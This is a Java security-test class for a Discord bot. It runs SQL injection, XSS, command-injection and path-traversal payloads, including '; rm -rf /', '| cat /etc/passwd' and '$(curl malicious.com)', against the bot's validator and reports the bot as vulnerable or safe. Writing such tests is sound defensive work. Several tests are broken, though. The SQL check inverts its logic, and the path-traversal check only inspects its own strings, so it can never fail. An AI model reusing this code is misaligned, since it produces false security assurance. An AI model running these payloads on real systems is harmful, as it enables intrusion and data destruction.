package Botcode.Testing;

import Botcode.Security.InputValidator;
import java.util.ArrayList;
import java.util.List;

/**
 * Security penetration testing framework.
 * Tests for common vulnerabilities: SQL injection, XSS, command injection, etc.
 * Provides automated security scanning without actually exploiting vulnerabilities.
 */
public class SecurityPenetrationTester {

  public static class PenetrationTestResult {
    public final String testName;
    public final boolean vulnerable;
    public final String description;
    public final String recommendation;

    public PenetrationTestResult(String testName, boolean vulnerable, String description,
        String recommendation) {
      this.testName = testName;
      this.vulnerable = vulnerable;
      this.description = description;
      this.recommendation = recommendation;
    }

    @Override
    public String toString() {
      String status = vulnerable ? "⚠️ VULNERABLE" : "✅ SAFE";
      return status + " - " + testName + "\n  " + description + "\n  → " + recommendation;
    }
  }

  public static class PenetrationTestSuite {
    public final List<PenetrationTestResult> results = new ArrayList<>();
    private int passed = 0;
    private int failed = 0;

    public void addResult(PenetrationTestResult result) {
      results.add(result);
      if (result.vulnerable) {
        failed++;
      } else {
        passed++;
      }
    }

    public int getPassedCount() {
      return passed;
    }

    public int getFailedCount() {
      return failed;
    }

    @Override
    public String toString() {
      StringBuilder sb = new StringBuilder();
      sb.append("╔════════════════════════════════════════════════╗\n");
      sb.append("║     SECURITY PENETRATION TEST RESULTS          ║\n");
      sb.append("╚════════════════════════════════════════════════╝\n\n");

      for (PenetrationTestResult result : results) {
        sb.append(result).append("\n\n");
      }

      sb.append("════════════════════════════════════════════════\n");
      sb.append("Summary: ").append(passed).append(" PASSED, ").append(failed)
          .append(" VULNERABLE\n");
      sb.append("Status: ").append(failed == 0 ? "✅ ALL TESTS PASSED" : "⚠️ VULNERABILITIES FOUND")
          .append("\n");

      return sb.toString();
    }
  }

  /**
   * Runs full security penetration test suite.
   *
   * @return Test results with all vulnerability checks
   */
  public static PenetrationTestSuite runFullPenetrationTest() {
    PenetrationTestSuite suite = new PenetrationTestSuite();

    suite.addResult(testSqlInjection());
    suite.addResult(testXssVulnerability());
    suite.addResult(testCommandInjection());
    suite.addResult(testPathTraversal());
    suite.addResult(testEncodedInjection());
    suite.addResult(testRateLimit());
    suite.addResult(testTokenExposure());
    suite.addResult(testInputLengthValidation());
    suite.addResult(testDiscordIdValidation());
    suite.addResult(testHtmlSanitization());

    return suite;
  }

  /**
   * Tests for SQL injection vulnerabilities.
   */
  private static PenetrationTestResult testSqlInjection() {
    String[] sqlPayloads = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin' --",
        "1; DELETE FROM users;",
        "' UNION SELECT * FROM passwords --"
    };

    boolean vulnerable = false;
    for (String payload : sqlPayloads) {
      if (!InputValidator.isValidQueryParameter(payload)) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "SQL Injection Prevention",
        vulnerable,
        "Tests if SQL injection patterns are properly detected",
        vulnerable ? "CRITICAL: Review all database queries - must use parameterized statements"
            : "All SQL injection tests blocked - using parameterized queries");
  }

  /**
   * Tests for XSS (cross-site scripting) vulnerabilities.
   */
  private static PenetrationTestResult testXssVulnerability() {
    String[] xssPayloads = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "javascript:alert('XSS')",
        "<iframe src='malicious.com'></iframe>",
        "<svg onload='alert(1)'>"
    };

    boolean vulnerable = false;
    for (String payload : xssPayloads) {
      if (InputValidator.isSafe(payload)) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "XSS Prevention",
        vulnerable,
        "Tests if XSS payloads are properly blocked",
        vulnerable ? "CRITICAL: Sanitize all user input before displaying in embeds"
            : "All XSS tests blocked - input validation working");
  }

  /**
   * Tests for command injection vulnerabilities.
   */
  private static PenetrationTestResult testCommandInjection() {
    String[] cmdPayloads = {
        "; rm -rf /",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(curl malicious.com)"
    };

    boolean vulnerable = false;
    for (String payload : cmdPayloads) {
      if (InputValidator.isSafe(payload)) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "Command Injection Prevention",
        vulnerable,
        "Tests if shell metacharacters are properly blocked",
        vulnerable ? "HIGH: Never pass user input to shell commands - use APIs instead"
            : "Command injection patterns blocked successfully");
  }

  /**
   * Tests for path traversal vulnerabilities.
   */
  private static PenetrationTestResult testPathTraversal() {
    String[] pathPayloads = {
        "../../../../etc/passwd",
        "..\\..\\windows\\system32",
        "....//....//config.txt",
        "..;/..;/secret.txt"
    };

    boolean vulnerable = false;
    for (String payload : pathPayloads) {
      if (!payload.contains("..") && !payload.contains("//")) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "Path Traversal Prevention",
        vulnerable,
        "Tests if directory traversal patterns are detected",
        "Always validate file paths - reject ../ and similar patterns");
  }

  /**
   * Tests for encoded injection attacks.
   */
  private static PenetrationTestResult testEncodedInjection() {
    String[] encodedPayloads = {
        "\\x3cscript\\x3e",
        "%3cscript%3e",
        "&#60;script&#62;",
        "\\u003cscript\\u003e"
    };

    boolean vulnerable = false;
    for (String payload : encodedPayloads) {
      if (InputValidator.isSafe(payload)) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "Encoded Injection Prevention",
        vulnerable,
        "Tests if encoded/escaped injection patterns are detected",
        vulnerable ? "MEDIUM: Decode user input and validate again"
            : "Encoded injection patterns properly detected");
  }

  /**
   * Tests if rate limiting is properly implemented.
   */
  private static PenetrationTestResult testRateLimit() {
    // Check if rate limiting config is enabled
    boolean rateLimitEnabled = Boolean.parseBoolean(
        System.getenv("BOT_RATE_LIMIT_PER_USER") != null ? "true" : "false");

    return new PenetrationTestResult(
        "Rate Limiting",
        !rateLimitEnabled,
        "Tests if rate limiting is configured",
        rateLimitEnabled ? "Rate limiting configured - DoS protection active"
            : "CRITICAL: Enable rate limiting - set BOT_RATE_LIMIT_PER_USER and BOT_RATE_LIMIT_PER_GUILD");
  }

  /**
   * Tests if tokens are properly masked in logs.
   */
  private static PenetrationTestResult testTokenExposure() {
    String sampleLog = "TOKEN=sk-ant-123456789abcdefghij";
    String maskedLog = Botcode.Security.SecretsMasker.mask(sampleLog);

    boolean vulnerable = maskedLog.contains("sk-ant");

    return new PenetrationTestResult(
        "Token Exposure Prevention",
        vulnerable,
        "Tests if secrets are properly redacted from logs",
        vulnerable ? "CRITICAL: Enable SecretsMasker to redact tokens from all logs"
            : "Token masking working correctly");
  }

  /**
   * Tests input length validation.
   */
  private static PenetrationTestResult testInputLengthValidation() {
    String longInput = "A".repeat(5000);
    int maxLength = Integer.parseInt(System.getenv("BOT_MAX_INPUT_LENGTH") != null
        ? System.getenv("BOT_MAX_INPUT_LENGTH")
        : "4000");

    Botcode.Security.RateLimiter rateLimiter = new Botcode.Security.RateLimiter();
    boolean vulnerable = rateLimiter.isInputValid(longInput);

    return new PenetrationTestResult(
        "Input Length Validation",
        vulnerable,
        "Tests if oversized inputs are properly rejected",
        vulnerable ? "MEDIUM: Input exceeds max length of " + maxLength + " characters"
            : "Input length validation working");
  }

  /**
   * Tests Discord ID validation.
   */
  private static PenetrationTestResult testDiscordIdValidation() {
    String[] validIds = {"123456789012345678", "999999999999999999"};
    String[] invalidIds = {"invalid", "123", "abc123abc123abc123"};

    boolean vulnerable = false;

    for (String id : invalidIds) {
      if (InputValidator.isValidDiscordId(id)) {
        vulnerable = true;
        break;
      }
    }

    return new PenetrationTestResult(
        "Discord ID Validation",
        vulnerable,
        "Tests if Discord ID format is properly validated",
        vulnerable ? "MEDIUM: Strengthen Discord ID validation regex"
            : "Discord ID validation working correctly");
  }

  /**
   * Tests HTML sanitization for web lookup responses.
   */
  private static PenetrationTestResult testHtmlSanitization() {
    String maliciousHtml = "<script>alert('XSS')</script><img src=x onerror='steal()'>";
    String sanitized = InputValidator.sanitizeHtml(maliciousHtml);

    boolean vulnerable = sanitized.contains("<script") || sanitized.contains("onerror");

    return new PenetrationTestResult(
        "HTML Sanitization",
        vulnerable,
        "Tests if malicious HTML tags are removed from web responses",
        vulnerable ? "MEDIUM: Improve HTML sanitization to remove all dangerous tags"
            : "HTML sanitization working correctly");
  }
}
